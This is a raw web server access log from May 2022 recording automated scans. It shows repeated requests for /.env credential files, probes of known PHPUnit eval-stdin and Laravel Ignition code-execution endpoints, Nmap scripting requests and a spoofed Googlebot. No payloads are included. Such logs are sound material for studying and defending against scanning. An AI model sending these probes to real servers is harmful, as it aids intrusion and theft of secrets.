45.9.20.101 - - [11/May/2022:14:30:08 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
52.185.32.178 - - [11/May/2022:14:43:16 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
52.185.32.178 - - [11/May/2022:14:43:16 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [11/May/2022:14:53:09 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [11/May/2022:14:53:10 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.9.20.101 - - [11/May/2022:14:58:23 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.239.173.152 - - [11/May/2022:14:59:36 +0000] "HEAD /robots.txt HTTP/1.0" 500 171 "-" "-"
109.237.103.123 - - [11/May/2022:15:00:43 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [11/May/2022:15:00:43 +0000] "\x16\x03\x01\x01D\x01" 400 488 "-" "-"
45.9.20.101 - - [11/May/2022:16:20:26 +0000] "GET /_ignition/execute-solution HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.79.29.48 - - [11/May/2022:16:47:24 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [11/May/2022:16:47:24 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [11/May/2022:17:53:14 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [11/May/2022:17:53:15 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.104.88.48 - - [11/May/2022:18:41:37 +0000] "\x16\x03" 400 488 "-" "-"
172.104.88.48 - - [11/May/2022:18:41:38 +0000] "GET /oDUT HTTP/1.1" 500 803 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
172.104.88.48 - - [11/May/2022:18:41:38 +0000] "GET /iUUJ HTTP/1.1" 500 803 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
92.118.160.9 - - [11/May/2022:18:44:23 +0000] "GET / HTTP/1.0" 500 803 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
111.19.251.202 - - [11/May/2022:19:15:12 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
45.144.112.133 - - [11/May/2022:19:34:17 +0000] "GET /api.php?key=1&apikey=1 HTTP/1.1" 500 803 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
